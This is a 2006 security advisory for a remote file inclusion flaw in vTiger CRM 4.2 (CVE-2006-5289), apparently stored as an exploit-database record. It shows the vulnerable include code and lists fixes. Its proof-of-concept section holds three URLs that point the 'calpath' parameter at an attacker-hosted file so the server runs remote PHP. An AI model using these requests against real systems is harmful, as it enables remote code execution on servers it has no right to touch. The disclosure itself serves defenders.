{
  "id": "2508",
  "title": "vTiger CRM 4.2 - &#039;calpath&#039; Multiple Remote File Inclusions",
  "cve": "CVE-2006-5289",
  "vuln_type": "rce",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\\r\n |    __)_ /    \\  \\//    ~    \\/   |   \\\r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/                              .OR.ID\r\nECHO_ADV_54$2006\r\n\r\n-----------------------------------------------------------------------------------------------\r\n[ECHO_ADV_54$2006]vtiger CRM  <=4.2 (calpath) Multiple Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------------\r\n\r\nAuthor\t\t: Dedi Dwianto a.k.a the_day\r\nDate Found\t: October, 09th 2006\r\nLocation\t: Indonesia, Jakarta\r\nweb\t\t: http://advisories.echo.or.id/adv/adv54-theday-2006.txt\r\nCritical Lvl\t: Highly critical\r\nImpact\t\t: System access\r\nWhere\t\t: From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication\t: Vtiger CRM\r\nversion\t\t: <=4.2\r\nURL\t\t: http://vtiger.com\r\n\r\nvtiger CRM is 100% Open Source Customer Relationship Management solution built over\r\nLAMP/WAMP stack and other third-party open source packages.\r\nvtiger CRM software can be installed in Windows NT/2000/XP/2003 and different types \r\nUnix/Linux-based distributions, such as RedHat 7.2/8.0/9.0, Debian 3.0, SuSe 9.0, Fedora Core 3.0, \r\nMandrake 10.0, Mac OS, and FreeBSD.\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n\r\nIn folder modules/Calendar/admin/ I found vulnerability script update.php\r\n--------------------------update.php---------------------------------------\r\n....\r\n<?\r\n\r\n  include_once $calpath .'webelements.p3';\r\n  include_once $calpath .'permission.p3';\r\n...\r\n----------------------------------------------------------\r\n\r\nInput passed to the \"$calpath\" parameter in update.php is not\r\nproperly verified before being used. This can be exploited to execute\r\narbitrary PHP code by including files from local or external\r\nresources.\r\n\r\nAlso affected files on Files:\r\n\r\nmodules/Calendar/admin/update.php\r\nmodules/Calendar/admin/scheme.php\r\nmodules/Calendar/calendar.php\r\n\r\n\r\nProof Of Concept:\r\n~~~~~~~~~~~~~~\r\n\r\nhttp://target.com/[vtiger_crm_path]/modules/Calendar/admin/update.php?calpath=http://attacker.com/inject.txt?\r\nhttp://target.com/[vtiger_crm_path]/modules/Calendar/scheme.php?calpath=http://attacker.com/inject.txt?\r\nhttp://target.com/[vtiger_crm_path]/modules/Calendar/calendar.php?calpath=http://attacker.com/inject.txt?\r\n\r\nSolution:\r\n~~~~~~\r\n- Upgrade to Vtiger CRM 5.0\r\n- Sanitize variable $calpath on affected files.\r\n- Turn off register_globals\r\n\r\nTimeline:\r\n~~~~~~\r\n09 - 10 - 2006 Bugs Found\r\n09 - 10 - 2006 Vendor Contact\r\n09 - 10 - Public Disclosure\r\n\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~\r\n~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous\r\n~ Jessy My Brain\r\n~ az001,boom_3x,mathdule,angelia\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel - #e-c-h-o @irc.dal.net\r\n------------------------------------------------------------------------\r\n---\r\nContact:\r\n~~~\r\n     EcHo Research & Development Center\r\n     the_day[at]echo[dot]or[dot]id\r\n\r\n# milw0rm.com [2006-10-10]",
  "url": "https://www.exploit-db.com/exploits/2508"
}